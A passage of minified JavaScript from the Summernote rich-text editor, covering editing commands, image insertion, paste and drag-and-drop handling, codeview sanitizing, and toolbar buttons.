|| this.context.triggerEvent("change", this.$editable.html(), this.$editable) }, Jt.prototype.tab = function () { var t = this.getLastRange(); if (t.isCollapsed() && t.isOnCell()) this.table.tab(t); else { if (0 === this.options.tabSize) return !1; this.isLimited(this.options.tabSize) || (this.beforeCommand(), this.typing.insertTab(t, this.options.tabSize), this.afterCommand()) } }, Jt.prototype.untab = function () { var t = this.getLastRange(); if (t.isCollapsed() && t.isOnCell()) this.table.tab(t, !0); else if (0 === this.options.tabSize) return !1 }, Jt.prototype.wrapCommand = function (t) { return function () { this.beforeCommand(), t.apply(this, arguments), this.afterCommand() } }, Jt.prototype.insertImage = function (t, e) { var n, i = this; return n = t, B.Deferred(function (t) { var e = B("<img>"); e.one("load", function () { e.off("error abort"), t.resolve(e) }).one("error abort", function () { e.off("load").detach(), t.reject(e) }).css({ display: "none" }).appendTo(document.body).attr("src", n) }).promise().then(function (t) { i.beforeCommand(), "function" == typeof e ? e(t) : ("string" == typeof e && t.attr("data-filename", e), t.css("width", Math.min(i.$editable.width(), t.width()))), t.show(), Wt.create(i.editable).insertNode(t[0]), Wt.createFromNodeAfter(t[0]).select(), i.setLastRange(), i.afterCommand() }).fail(function (t) { i.context.triggerEvent("image.upload.error", t) }) }, Jt.prototype.insertImagesAsDataURL = function (t) { var o = this; B.each(t, function (t, e) { var i, n = e.name; o.options.maximumImageFileSize && o.options.maximumImageFileSize < e.size ? o.context.triggerEvent("image.upload.error", o.lang.image.maximumFileSizeError) : (i = e, B.Deferred(function (n) { B.extend(new FileReader, { onload: function (t) { var e = t.target.result; n.resolve(e) }, onerror: function (t) { n.reject(t) } }).readAsDataURL(i) }).promise().then(function (t) { return o.insertImage(t, n) }).fail(function () { o.context.triggerEvent("image.upload.error") })) }) }, Jt.prototype.insertImagesOrCallback = function (t) { this.options.callbacks.onImageUpload ? this.context.triggerEvent("image.upload", t) : this.insertImagesAsDataURL(t) }, Jt.prototype.getSelectedText = function () { var t = this.getLastRange(); return t.isOnAnchor() && (t = Wt.createFromNode(wt.ancestor(t.sc, wt.isAnchor))), t.toString() }, Jt.prototype.onFormatBlock = function (t, e) { var n, i; document.execCommand("FormatBlock", !1, S.isMSIE ? "<" + t + ">" : t), e && e.length && (e[0].tagName.toUpperCase() !== t.toUpperCase() && (e = e.find(t)), e && e.length && (n = e[0].className || "") && (i = this.createRange(), B([i.sc, i.ec]).closest(t).addClass(n))) }, Jt.prototype.formatPara = function () { this.formatBlock("P") }, Jt.prototype.fontStyling = function (t, e) { var n, i, o = this.getLastRange(); o && (n = this.style.styleNodes(o), B(n).css(t, e), !o.isCollapsed() || (i = T.head(n)) && !wt.nodeLength(i) && (i.innerHTML = wt.ZERO_WIDTH_NBSP_CHAR, Wt.createFromNodeAfter(i.firstChild).select(), this.setLastRange(), this.$editable.data("bogus", i))) }, Jt.prototype.unlink = function () { var t, e = this.getLastRange(); e.isOnAnchor() && (t = wt.ancestor(e.sc, wt.isAnchor), (e = Wt.createFromNode(t)).select(), this.setLastRange(), this.beforeCommand(), document.execCommand("unlink"), this.afterCommand()) }, Jt.prototype.getLinkInfo = function () { var t = this.getLastRange().expand(wt.isAnchor), e = B(T.head(t.nodes(wt.isAnchor))), n = { range: t, text: t.toString(), url: e.length ? e.attr("href") : "" }; return e.length && (n.isNewWindow = "_blank" === e.attr("target")), n }, Jt.prototype.addRow = function (t) { var e = this.getLastRange(this.$editable); e.isCollapsed() && e.isOnCell() && (this.beforeCommand(), this.table.addRow(e, t), this.afterCommand()) }, Jt.prototype.addCol = function (t) { var e = this.getLastRange(this.$editable); e.isCollapsed() && e.isOnCell() && (this.beforeCommand(), this.table.addCol(e, t), this.afterCommand()) }, Jt.prototype.deleteRow = function () { var t = this.getLastRange(this.$editable); t.isCollapsed() && t.isOnCell() && (this.beforeCommand(), this.table.deleteRow(t), this.afterCommand()) }, Jt.prototype.deleteCol = function () { var t = this.getLastRange(this.$editable); t.isCollapsed() && t.isOnCell() && (this.beforeCommand(), this.table.deleteCol(t), this.afterCommand()) }, Jt.prototype.deleteTable = function () { var t = this.getLastRange(this.$editable); t.isCollapsed() && t.isOnCell() && (this.beforeCommand(), this.table.deleteTable(t), this.afterCommand()) }, Jt.prototype.resizeTo = function (t, e, n) { var i, o, a; a = n ? { width: (i = t.y / t.x) < (o = e.data("ratio")) ? t.x : t.y / o, height: i < o ? t.x * o : t.y } : { width: t.x, height: t.y }, e.css(a) }, Jt.prototype.hasFocus = function () { return this.$editable.is(":focus") }, Jt.prototype.focus = function () { this.hasFocus() || this.$editable.focus() }, Jt.prototype.isEmpty = function () { return wt.isEmpty(this.$editable[0]) || wt.emptyPara === this.$editable.html() }, Jt.prototype.empty = function () { this.context.invoke("code", wt.emptyPara) }, Jt.prototype.normalizeContent = function () { this.$editable[0].normalize() }, Jt); function Jt(t) { var I = this; this.context = t, this.$note = t.layoutInfo.note, this.$editor = t.layoutInfo.editor, this.$editable = t.layoutInfo.editable, this.options = t.options, this.lang = this.options.langInfo, this.editable = this.$editable[0], this.lastRange = null, this.style = new Rt, this.table = new zt, this.typing = new Vt(t), this.bullet = new Ot, this.history = new Ht(this.$editable), this.context.memo("help.undo", this.lang.help.undo), this.context.memo("help.redo", this.lang.help.redo), this.context.memo("help.tab", this.lang.help.tab), this.context.memo("help.untab", this.lang.help.untab), this.context.memo("help.insertParagraph", this.lang.help.insertParagraph), this.context.memo("help.insertOrderedList", this.lang.help.insertOrderedList), this.context.memo("help.insertUnorderedList", this.lang.help.insertUnorderedList), this.context.memo("help.indent", this.lang.help.indent), this.context.memo("help.outdent", this.lang.help.outdent), this.context.memo("help.formatPara", this.lang.help.formatPara), this.context.memo("help.insertHorizontalRule", this.lang.help.insertHorizontalRule), this.context.memo("help.fontName", this.lang.help.fontName); for (var e = ["bold", "italic", "underline", "strikethrough", "superscript", "subscript", "justifyLeft", "justifyCenter", "justifyRight", "justifyFull", "formatBlock", "removeFormat", "backColor"], n = 0, i = e.length; n < i; n++)this[e[n]] = function (e) { return function (t) { I.beforeCommand(), document.execCommand(e, !1, t), I.afterCommand(!0) } }(e[n]), this.context.memo("help." + e[n], this.lang.help[e[n]]); this.fontName = this.wrapCommand(function (t) { return I.fontStyling("font-family", "'" + t + "'") }), this.fontSize = this.wrapCommand(function (t) { return I.fontStyling("font-size", t + "px") }); for (n = 1; n <= 6; n++)this["formatH" + n] = function (t) { return function () { I.formatBlock("H" + t) } }(n), this.context.memo("help.formatH" + n, this.lang.help["formatH" + n]); this.insertParagraph = this.wrapCommand(function () { I.typing.insertParagraph(I.editable) }), this.insertOrderedList = this.wrapCommand(function () { I.bullet.insertOrderedList(I.editable) }), this.insertUnorderedList = this.wrapCommand(function () { I.bullet.insertUnorderedList(I.editable) }), this.indent = this.wrapCommand(function () { I.bullet.indent(I.editable) }), this.outdent = this.wrapCommand(function () { I.bullet.outdent(I.editable) }), this.insertNode = this.wrapCommand(function (t) { I.isLimited(B(t).text().length) || (I.getLastRange().insertNode(t), Wt.createFromNodeAfter(t).select(), I.setLastRange()) }), this.insertText = this.wrapCommand(function (t) { var e; I.isLimited(t.length) || (e = I.getLastRange().insertNode(wt.createText(t)), Wt.create(e, wt.nodeLength(e)).select(), I.setLastRange()) }), this.pasteHTML = this.wrapCommand(function (t) { var e; I.isLimited(t.length) || (t = I.context.invoke("codeview.purify", t), e = I.getLastRange().pasteHTML(t), Wt.createFromNodeAfter(T.last(e)).select(), I.setLastRange()) }), this.formatBlock = this.wrapCommand(function (t, e) { var n = I.options.callbacks.onApplyCustomStyle; n ? n.call(I, e, I.context, I.onFormatBlock) : I.onFormatBlock(t, e) }), this.insertHorizontalRule = this.wrapCommand(function () { var t = I.getLastRange().insertNode(wt.create("HR")); t.nextSibling && (Wt.create(t.nextSibling, 0).normalize().select(), I.setLastRange()) }), this.lineHeight = this.wrapCommand(function (t) { I.style.stylePara(I.getLastRange(), { lineHeight: t }) }), this.createLink = this.wrapCommand(function (t) { var e, n, i, o, a, s = t.url, r = t.text, g = t.isNewWindow, l = t.range || I.getLastRange(), c = r.length - l.toString().length; 0 < c && I.isLimited(c) || (e = l.toString() !== r, "string" == typeof s && (s = s.trim()), s = I.options.onCreateLink ? I.options.onCreateLink(s) : /^([A-Za-z][A-Za-z0-9+-.]*\:|#|\/)/.test(s) ? s : "https://" + s, n = [], e ? (i = (l = l.deleteContents()).insertNode(B("<A>" + r + "</A>")[0]), n.push(i)) : n = I.style.styleNodes(l, { nodeName: "A", expandClosestSibling: !0, onlyPartialContains: !0 }), B.each(n, function (t, e) { B(e).attr("href", s), g ? B(e).attr("target", "_blank") : B(e).removeAttr("target") }), o = Wt.createFromNodeBefore(T.head(n)).getStartPoint(), a = Wt.createFromNodeAfter(T.last(n)).getEndPoint(), Wt.create(o.node, o.offset, a.node, a.offset).select(), I.setLastRange()) }), this.color = this.wrapCommand(function (t) { var e = t.foreColor, n = t.backColor; e && document.execCommand("foreColor", !1, e), n && document.execCommand("backColor", !1, n) }), this.foreColor = this.wrapCommand(function (t) { document.execCommand("styleWithCSS", !1, !0), document.execCommand("foreColor", !1, t) }), this.insertTable = this.wrapCommand(function (t) { var e = t.split("x"); I.getLastRange().deleteContents().insertNode(I.table.createTable(e[0], e[1], I.options)) }), this.removeMedia = this.wrapCommand(function () { var t = B(I.restoreTarget()).parent(); t.parent("figure").length ? t.parent("figure").remove() : t = B(I.restoreTarget()).detach(), I.context.triggerEvent("media.delete", t, I.$editable) }), this.floatMe = this.wrapCommand(function (t) { var e = B(I.restoreTarget()); e.toggleClass("note-float-left", "left" === t), e.toggleClass("note-float-right", "right" === t), e.css("float", "none" === t ? "" : t) }), this.resize = this.wrapCommand(function (t) { var e = B(I.restoreTarget()); 0 === (t = parseFloat(t)) ? e.css("width", "") : e.css({ width: 100 * t + "%", height: "" }) }) } var jt = ($t.prototype.initialize = function () { this.$editable.on("paste", this.pasteByEvent.bind(this)) }, $t.prototype.pasteByEvent = function (t) { var e, n = t.originalEvent.clipboardData; n && n.items && n.items.length && ("file" === (e = 1 < n.items.length ? n.items[1] : T.head(n.items)).kind && -1 !== e.type.indexOf("image/") && this.context.invoke("editor.insertImagesOrCallback", [e.getAsFile()]), this.context.invoke("editor.afterCommand")) }, $t); function $t(t) { this.context = t, this.$editable = t.layoutInfo.editable } var qt, te = (ee.prototype.initialize = function () { this.options.disableDragAndDrop ? (this.documentEventHandlers.onDrop = function (t) { t.preventDefault() }, this.$eventListener = this.$dropzone, this.$eventListener.on("drop", this.documentEventHandlers.onDrop)) : this.attachDragAndDropEvent() }, ee.prototype.attachDragAndDropEvent = function () { var o = this, i = B(), a = this.$dropzone.find(".note-dropzone-message"); this.documentEventHandlers.onDragenter = function (t) { var e = o.context.invoke("codeview.isActivated"), n = 0 < o.$editor.width() && 0 < o.$editor.height(); e || i.length || !n || (o.$editor.addClass("dragover"), o.$dropzone.width(o.$editor.width()), o.$dropzone.height(o.$editor.height()), a.text(o.lang.image.dragImageHere)), i = i.add(t.target) }, this.documentEventHandlers.onDragleave = function (t) { (i = i.not(t.target)).length || o.$editor.removeClass("dragover") }, this.documentEventHandlers.onDrop = function () { i = B(), o.$editor.removeClass("dragover") }, this.$eventListener.on("dragenter", this.documentEventHandlers.onDragenter).on("dragleave", this.documentEventHandlers.onDragleave).on("drop", this.documentEventHandlers.onDrop), this.$dropzone.on("dragenter", function () { o.$dropzone.addClass("hover"), a.text(o.lang.image.dropImage) }).on("dragleave", function () { o.$dropzone.removeClass("hover"), a.text(o.lang.image.dragImageHere) }), this.$dropzone.on("drop", function (t) { var i = t.originalEvent.dataTransfer; t.preventDefault(), i && i.files && i.files.length ? (o.$editable.focus(), o.context.invoke("editor.insertImagesOrCallback", i.files)) : B.each(i.types, function (t, e) { var n = i.getData(e); -1 < e.toLowerCase().indexOf("text") ? o.context.invoke("editor.pasteHTML", n) : B(n).each(function (t, e) { o.context.invoke("editor.insertNode", e) }) }) }).on("dragover", !1) }, ee.prototype.destroy = function () { var e = this; Object.keys(this.documentEventHandlers).forEach(function (t) { e.$eventListener.off(t.substr(2).toLowerCase(), e.documentEventHandlers[t]) }), this.documentEventHandlers = {} }, ee); function ee(t) { this.context = t, this.$eventListener = B(document), this.$editor = t.layoutInfo.editor, this.$editable = t.layoutInfo.editable, this.options = t.options, this.lang = this.options.langInfo, this.documentEventHandlers = {}, this.$dropzone = B(['<div class="note-dropzone">', '  <div class="note-dropzone-message"/>', "</div>"].join("")).prependTo(this.$editor) } S.hasCodeMirror && (qt = window.CodeMirror); var ne = (ie.prototype.sync = function () { this.isActivated() && S.hasCodeMirror && this.$codable.data("cmEditor").save() }, ie.prototype.isActivated = function () { return this.$editor.hasClass("codeview") }, ie.prototype.toggle = function () { this.isActivated() ? this.deactivate() : this.activate(), this.context.triggerEvent("codeview.toggled") }, ie.prototype.purify = function (t) { var o; return this.options.codeviewFilter && (t = t.replace(this.options.codeviewFilterRegex, ""), this.options.codeviewIframeFilter && (o = this.options.codeviewIframeWhitelistSrc.concat(this.options.codeviewIframeWhitelistSrcBase), t = t.replace(/(<iframe.*?>.*?(?:<\/iframe>)?)/gi, function (t) { if (/<.+src(?==?('|"|\s)?)[\s\S]+src(?=('|"|\s)?)[^>]*?>/i.test(t)) return ""; for (var e = 0, n = o; e < n.length; e++) { var i = n[e]; if (new RegExp('src="(https?:)?//' + i.replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&") + '/(.+)"').test(t)) return t } return "" }))), t }, ie.prototype.activate = function () { var e, n, i = this; this.$codable.val(wt.html(this.$editable, this.options.prettifyHtml)), this.$codable.height(this.$editable.height()), this.context.invoke("toolbar.updateCodeview", !0), this.$editor.addClass("codeview"), this.$codable.focus(), S.hasCodeMirror ? (e = qt.fromTextArea(this.$codable[0], this.options.codemirror), this.options.codemirror.tern && (n = new qt.TernServer(this.options.codemirror.tern), e.ternServer = n, e.on("cursorActivity", function (t) { n.updateArgHints(t) })), e.on("blur", function (t) { i.context.triggerEvent("blur.codeview", e.getValue(), t) }), e.on("change", function (t) { i.context.triggerEvent("change.codeview", e.getValue(), e) }), e.setSize(null, this.$editable.outerHeight()), this.$codable.data("cmEditor", e)) : (this.$codable.on("blur", function (t) { i.context.triggerEvent("blur.codeview", i.$codable.val(), t) }), this.$codable.on("input", function (t) { i.context.triggerEvent("change.codeview", i.$codable.val(), i.$codable) })) }, ie.prototype.deactivate = function () { var t; S.hasCodeMirror && (t = this.$codable.data("cmEditor"), this.$codable.val(t.getValue()), t.toTextArea()); var e = this.purify(wt.value(this.$codable, this.options.prettifyHtml) || wt.emptyPara), n = this.$editable.html() !== e; this.$editable.html(e), this.$editable.height(this.options.height ? this.$codable.height() : "auto"), this.$editor.removeClass("codeview"), n && this.context.triggerEvent("change", this.$editable.html(), this.$editable), this.$editable.focus(), this.context.invoke("toolbar.updateCodeview", !1) }, ie.prototype.destroy = function () { this.isActivated() && this.deactivate() }, ie); function ie(t) { this.context = t, this.$editor = t.layoutInfo.editor, this.$editable = t.layoutInfo.editable, this.$codable = t.layoutInfo.codable, this.options = t.options } var oe = (ae.prototype.initialize = function () { var i = this; this.options.airMode || this.options.disableResizeEditor ? this.destroy() : this.$statusbar.on("mousedown", function (t) { function e(t) { var e = t.clientY - (24 + n), e = 0 < i.options.minheight ? Math.max(e, i.options.minheight) : e; e = 0 < i.options.maxHeight ? Math.min(e, i.options.maxHeight) : e, i.$editable.height(e) } t.preventDefault(), t.stopPropagation(); var n = i.$editable.offset().top - i.$document.scrollTop(); i.$document.on("mousemove", e).one("mouseup", function () { i.$document.off("mousemove", e) }) }) }, ae.prototype.destroy = function () { this.$statusbar.off(), this.$statusbar.addClass("locked") }, ae); function ae(t) { this.$document = B(document), this.$statusbar = t.layoutInfo.statusbar, this.$editable = t.layoutInfo.editable, this.options = t.options } var se = (re.prototype.resizeTo = function (t) { this.$editable.css("height", t.h), this.$codable.css("height", t.h), this.$codable.data("cmeditor") && this.$codable.data("cmeditor").setsize(null, t.h) }, re.prototype.toggle = function () { this.$editor.toggleClass("fullscreen"), this.isFullscreen() ? (this.$editable.data("orgHeight", this.$editable.css("height")), this.$editable.data("orgMaxHeight", this.$editable.css("maxHeight")), this.$editable.css("maxHeight", ""), this.$window.on("resize", this.onResize).trigger("resize"), this.$scrollbar.css("overflow", "hidden")) : (this.$window.off("resize", this.onResize), this.resizeTo({ h: this.$editable.data("orgHeight") }), this.$editable.css("maxHeight", this.$editable.css("orgMaxHeight")), this.$scrollbar.css("overflow", "visible")), this.context.invoke("toolbar.updateFullscreen", this.isFullscreen()) }, re.prototype.isFullscreen = function () { return this.$editor.hasClass("fullscreen") }, re); function re(t) { var e = this; this.context = t, this.$editor = t.layoutInfo.editor, this.$toolbar = t.layoutInfo.toolbar, this.$editable = t.layoutInfo.editable, this.$codable = t.layoutInfo.codable, this.$window = B(window), this.$scrollbar = B("html, body"), this.onResize = function () { e.resizeTo({ h: e.$window.height() - e.$toolbar.outerHeight() }) } } var ge = (le.prototype.initialize = function () { var a = this; this.$handle = B(['<div class="note-handle">', '<div class="note-control-selection">', '<div class="note-control-selection-bg"></div>', '<div class="note-control-holder note-control-nw"></div>', '<div class="note-control-holder note-control-ne"></div>', '<div class="note-control-holder note-control-sw"></div>', '<div class="', this.options.disableResizeImage ? "note-control-holder" : "note-control-sizing", ' note-control-se"></div>', this.options.disableResizeImage ? "" : '<div class="note-control-selection-info"></div>', "</div>", "</div>"].join("")).prependTo(this.$editingArea), this.$handle.on("mousedown", function (t) { var e, n, i, o; wt.isControlSizing(t.target) && (t.preventDefault(), t.stopPropagation(), e = a.$handle.find(".note-control-selection").data("target"), n = e.offset(), i = a.$document.scrollTop(), o = function (t) { a.context.invoke("editor.resizeTo", { x: t.clientX - n.left, y: t.clientY - (n.top - i) }, e, !t.shiftKey), a.update(e[0]) }, a.$document.on("mousemove", o).one("mouseup", function (t) { t.preventDefault(), a.$document.off("mousemove", o), a.context.invoke("editor.afterCommand") }), e.data("ratio") || e.data("ratio", e.height() / e.width())) }), this.$handle.on("wheel", function (t) { t.preventDefault(), a.update() }) }, le.prototype.destroy = function () { this.$handle.remove() }, le.prototype.update = function (t, e) { if (this.context.isDisabled()) return !1; var n, i, o, a, s, r, g = wt.isImg(t), l = this.$handle.find(".note-control-selection"); return this.context.invoke("imagePopover.update", t, e), g ? (o = { left: (i = (n = B(t)).position()).left + parseInt(n.css("marginLeft"), 10), top: i.top + parseInt(n.css("marginTop"), 10) }, a = { w: n.outerWidth(!1), h: n.outerHeight(!1) }, l.css({ display: "block", left: o.left, top: o.top, width: a.w, height: a.h }).data("target", n), (s = new Image).src = n.attr("src"), r = a.w + "x" + a.h + " (" + this.lang.image.original + ": " + s.width + "x" + s.height + ")", l.find(".note-control-selection-info").text(r), this.context.invoke("editor.saveTarget", t)) : this.hide(), g }, le.prototype.hide = function () { this.context.invoke("editor.clearTarget"), this.$handle.children().hide() }, le); function le(t) { var n = this; this.context = t, this.$document = B(document), this.$editingArea = t.layoutInfo.editingArea, this.options = t.options, this.lang = this.options.langInfo, this.events = { "summernote.mousedown": function (t, e) { n.update(e.target, e) && e.preventDefault() }, "summernote.keyup summernote.scroll summernote.change summernote.dialog.shown": function () { n.update() }, "summernote.disable": function () { n.hide() }, "summernote.codeview.toggled": function () { n.update() } } } var ce = /^([A-Za-z][A-Za-z0-9+-.]*\:[\/]{2}|mailto:[A-Z0-9._%+-]+@)?(www\.)?(.+)$/i, Ie = (ue.prototype.initialize = function () { this.lastWordRange = null }, ue.prototype.destroy = function () { this.lastWordRange = null }, ue.prototype.replace = function () { var t, e, n, i; !this.lastWordRange || (e = (t = this.lastWordRange.toString()).match(ce)) && (e[1] || e[2]) && (n = e[1] ? t : "https://" + t, i = B("<a />").html(t).attr("href", n)[0], this.context.options.linkTargetBlank && B(i).attr("target", "_blank"), this.lastWordRange.insertNode(i), this.lastWordRange = null, this.context.invoke("editor.focus")) }, ue.prototype.handleKeydown = function (t) { var e; T.contains([Tt.code.ENTER, Tt.code.SPACE], t.keyCode) && (e = this.context.invoke("editor.createRange").getWordRange(), this.lastWordRange = e) }, ue.prototype.handleKeyup = function (t) { T.contains([Tt.code.ENTER, Tt.code.SPACE], t.keyCode) && this.replace() }, ue); function ue(t) { var n = this; this.context = t, this.events = { "summernote.keyup": function (t, e) { e.isDefaultPrevented() || n.handleKeyup(e) }, "summernote.keydown": function (t, e) { n.handleKeydown(e) } } } var he = (de.prototype.shouldInitialize = function () { return wt.isTextarea(this.$note[0]) }, de); function de(t) { var e = this; this.$note = t.layoutInfo.note, this.events = { "summernote.change": function () { e.$note.val(t.invoke("code")) } } } var Ce = (Ae.prototype.shouldInitialize = function () { return !!this.options.match }, Ae.prototype.initialize = function () { this.lastWord = null }, Ae.prototype.destroy = function () { this.lastWord = null }, Ae.prototype.replace = function () { var n, t; this.lastWord && (t = (n = this).lastWord.toString(), this.options.match(t, function (t) { if (t) { var e = ""; if ("string" == typeof t ? e = wt.createText(t) : t instanceof jQuery ? e = t[0] : t instanceof Node && (e = t), !e) return; n.lastWord.insertNode(e), n.lastWord = null, n.context.invoke("editor.focus") } })) }, Ae.prototype.handleKeydown = function (t) { var e; this.previousKeydownCode && T.contains(this.keys, this.previousKeydownCode) || T.contains(this.keys, t.keyCode) && (e = this.context.invoke("editor.createRange").getWordRange(), this.lastWord = e), this.previousKeydownCode = t.keyCode }, Ae.prototype.handleKeyup = function (t) { T.contains(this.keys, t.keyCode) && this.replace() }, Ae); function Ae(t) { var n = this; this.context = t, this.options = t.options.replace || {}, this.keys = [Tt.code.ENTER, Tt.code.SPACE, Tt.code.PERIOD, Tt.code.COMMA, Tt.code.SEMICOLON, Tt.code.SLASH], this.previousKeydownCode = null, this.events = { "summernote.keyup": function (t, e) { e.isDefaultPrevented() || n.handleKeyup(e) }, "summernote.keydown": function (t, e) { n.handleKeydown(e) } } } var pe = (me.prototype.shouldInitialize = function () { return !!this.options.placeholder }, me.prototype.initialize = function () { var t = this; this.$placeholder = B('<div class="note-placeholder">'), this.$placeholder.on("click", function () { t.context.invoke("focus") }).html(this.options.placeholder).prependTo(this.$editingArea), this.update() }, me.prototype.destroy = function () { this.$placeholder.remove() }, me.prototype.update = function () { var t = !this.context.invoke("codeview.isActivated") && this.context.invoke("editor.isEmpty"); this.$placeholder.toggle(t) }, me); function me(t) { var e = this; this.context = t, this.$editingArea = t.layoutInfo.editingArea, this.options = t.options, this.events = { "summernote.init summernote.change": function () { e.update() }, "summernote.codeview.toggled": function () { e.update() } } } var fe = (be.prototype.representShortcut = function (t) { var e = this.invertedKeyMap[t]; return this.options.shortcuts && e ? (S.isMac && (e = e.replace("CMD", "â").replace("SHIFT", "â§")), " (" + (e = e.replace("BACKSLASH", "\\").replace("SLASH", "/").replace("LEFTBRACKET", "[").replace("RIGHTBRACKET", "]")) + ")") : "" }, be.prototype.button = function (t) { return !this.options.tooltip && t.tooltip && delete t.tooltip, t.container = this.options.container, this.ui.button(t) }, be.prototype.initialize = function () { this.addToolbarButtons(), this.addImagePopoverButtons(), this.addLinkPopoverButtons(), this.addTablePopoverButtons(), this.fontInstalledMap = {} }, be.prototype.destroy = function () { delete this.fontInstalledMap }, be.prototype.isFontInstalled = function (t) { return this.fontInstalledMap.hasOwnProperty(t) || (this.fontInstalledMap[t] = S.isFontInstalled(t) || T.contains(this.options.fontNamesIgnoreCheck, t)), this.fontInstalledMap[t] }, be.prototype.isFontDeservedToAdd = function (t) { return "" !== (t = t.toLowerCase()) && this.isFontInstalled(t) && -1 === ["sans-serif", "serif", "monospace", "cursive", "fantasy"].indexOf(t) }, be.prototype.colorPalette = function (u, t, n, i) { var h = this; return this.ui.buttonGroup({ className: "note-color " + u, children: [this.button({ className: "note-current-color-button", contents: this.ui.icon(this.options.icons.font + " note-recent-color"), tooltip: t, click: function (t) { var e = B(t.currentTarget); n && i ? h.context.invoke("editor.color", { backColor: e.attr("data-backColor"), foreColor: e.attr("data-foreColor") }) : n ? h.context.invoke("editor.color", { backColor: e.attr("data-backColor") }) : i && h.context.invoke("editor.color", { foreColor: e.attr("data-foreColor") }) }, callback: function (t) { var e = t.find(".note-recent-color"); n && (e.css("background-color", h.options.colorButton.backColor), t.attr("data-backColor", h.options.colorButton.backColor)), i ? (e.css("color", h.options.colorButton.foreColor), t.attr("data-foreColor", h.options.colorButton.foreColor)) : e.css("color", "transparent") } }), this.button({ className: "dropdown-toggle", contents: this.ui.dropdownButtonContents("", this.options), tooltip: this.lang.color.more, data: { toggle: "dropdown" } }), this.ui.dropdown({ items: (n ? ['<div class="note-palette">', '  <div class="note-palette-title">' + this.lang.color.background + "</div>", "  <div>", '    <button type="button" class="note-color-reset btn btn-light" data-event="backColor" data-value="inherit">', this.lang.color.transparent, "    </button>", "  </div>", '  <div class="note-holder" data-event="backColor"/>', "  <div>", '    <button type="button" class="note-color-select btn" data-event="openPalette" data-value="backColorPicker">', this.lang.color.cpSelect, "    </button>", '    <input type="color" id="backColorPicker" class="note-btn note-color-select-btn" value="' + this.options.colorButton.backColor + '" data-event="backColorPalette">', "  </div>", '  <div class="note-holder-custom" id="backColorPalette" data-event="backColor"/>', "</div>"].join("") : "") + (i ? ['<div class="note-palette">', '  <div class="note-palette-title">' + this.lang.color.foreground + "</div>", "  <div>", '    <button type="button" class="note-color-reset btn btn-light" data-event="removeFormat" data-value="foreColor">', this.lang.color.resetToDefault, "    </button>", "  </div>", '  <div class="note-holder" data-event="foreColor"/>', "  <div>", '    <button type="button" class="note-color-select btn" data-event="openPalette" data-value="foreColorPicker">', this.lang.color.cpSelect, "    </button>", '    <input type="color" id="foreColorPicker" class="note-btn note-color-select-btn" value="' + this.options.colorButton.foreColor + '" data-event="foreColorPalette">', '  <div class="note-holder-custom" id="foreColorPalette" data-event="foreColor"/>', "</div>"].join("") : ""), callback: function (n) { n.find(".note-holder").each(function (t, e) { var n = B(e); n.append(h.ui.palette({ colors: h.options.colors, colorsName: h.options.colorsName, eventName: n.data("event"), container: h.options.container, tooltip: h.options.tooltip }).render()) }); var i = [["#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF"]]; n.find(".note-holder-custom").each(function (t, e) { var n = B(e); n.append(h.ui.palette({ colors: i, colorsName: i, eventName: n.data("event"), container: h.options.container, tooltip: h.options.tooltip }).render()) }), n.find("input[type=color]").each(function (t, e) { B(e).change(function () { var t = n.find("#" + B(this).data("event")).find(".note-color-btn").first(), e = this.value.toUpperCase(); t.css("background-color", e).attr("aria-label", e).attr("data-value", e).attr("data-original-title", e), t.click() }) }) }, click: function (t) { t.stopPropagation(); var e, n, i, o, a, s, r, g = B("." + u), l = B(t.target), c = l.data("event"), I = l.attr("data-value"); "openPalette" === c ? (e = g.find("#" + I), i = (n = B(g.find("#" + e.data("event")).find(".note-color-row")[0])).find(".note-color-btn").last().detach(), o = e.val(), i.css("background-color", o).attr("aria-label", o).attr("data-value", o).attr("data-original-title", o), n.prepend(i), e.click()) : T.contains(["backColor", "foreColor"], c) && (a = "backColor" === c ? "background-color" : "color", s = l.closest(".note-color").find(".note-recent-color"), r = l.closest(".note-color").find(".note-current-color-button"), s.css(a, I), r.attr("data-" + c, I), h.context.invoke("editor." + c, I)) } })] }).render() }, be.prototype.addToolbarButtons = function () { var i = this; this.context.memo("button.style", function () { return i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents(i.ui.icon(i.options.icons.magic), i.options), tooltip: i.lang.style.style, data: { toggle: "dropdown" } }), i.ui.dropdown({ className: "dropdown-style", items: i.options.styleTags, title: i.lang.style.style, template: function (t) { "string" == typeof t && (t = { tag: t, title: i.lang.style.hasOwnProperty(t) ? i.lang.style[t] : t }); var e = t.tag, n = t.title; return "<" + e + (t.style ? ' style="' + t.style + '" ' : "") + (t.className ? ' class="' + t.className + '"' : "") + ">" + n + "</" + e + ">" }, click: i.context.createInvokeHandler("editor.formatBlock") })]).render() }); for (var n = this, t = 0, e = this.options.styleTags.length; t < e; t++)!function (t) { var e = n.options.styleTags[t]; n.context.memo("button.style." + e, function () { return i.button({ className: "note-btn-style-" + e, contents: '<div data-value="' + e + '">' + e.toUpperCase() + "</div>", tooltip: i.lang.style[e], click: i.context.createInvokeHandler("editor.formatBlock") }).render() }) }(t); this.context.memo("button.bold", function () { return i.button({ className: "note-btn-bold", contents: i.ui.icon(i.options.icons.bold), tooltip: i.lang.font.bold + i.representShortcut("bold"), click: i.context.createInvokeHandlerAndUpdateState("editor.bold") }).render() }), this.context.memo("button.italic", function () { return i.button({ className: "note-btn-italic", contents: i.ui.icon(i.options.icons.italic), tooltip: i.lang.font.italic + i.representShortcut("italic"), click: i.context.createInvokeHandlerAndUpdateState("editor.italic") }).render() }), this.context.memo("button.underline", function () { return i.button({ className: "note-btn-underline", contents: i.ui.icon(i.options.icons.underline), tooltip: i.lang.font.underline + i.representShortcut("underline"), click: i.context.createInvokeHandlerAndUpdateState("editor.underline") }).render() }), this.context.memo("button.clear", function () { return i.button({ contents: i.ui.icon(i.options.icons.eraser), tooltip: i.lang.font.clear + i.representShortcut("removeFormat"), click: i.context.createInvokeHandler("editor.removeFormat") }).render() }), this.context.memo("button.strikethrough", function () { return i.button({ className: "note-btn-strikethrough", contents: i.ui.icon(i.options.icons.strikethrough), tooltip: i.lang.font.strikethrough + i.representShortcut("strikethrough"), click: i.context.createInvokeHandlerAndUpdateState("editor.strikethrough") }).render() }), this.context.memo("button.superscript", function () { return i.button({ className: "note-btn-superscript", contents: i.ui.icon(i.options.icons.superscript), tooltip: i.lang.font.superscript, click: i.context.createInvokeHandlerAndUpdateState("editor.superscript") }).render() }), this.context.memo("button.subscript", function 